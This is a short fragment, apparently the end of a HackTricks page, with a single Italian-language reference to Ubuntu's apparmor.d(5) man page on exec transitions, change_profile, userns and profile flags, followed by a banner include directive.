+- [2] [Pagina man di `apparmor.d(5)` di Ubuntu 24.04: transizioni exec, `change_profile`, `userns` e flag dei profili](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
 {{#include ../../../../banners/hacktricks-training.md}}
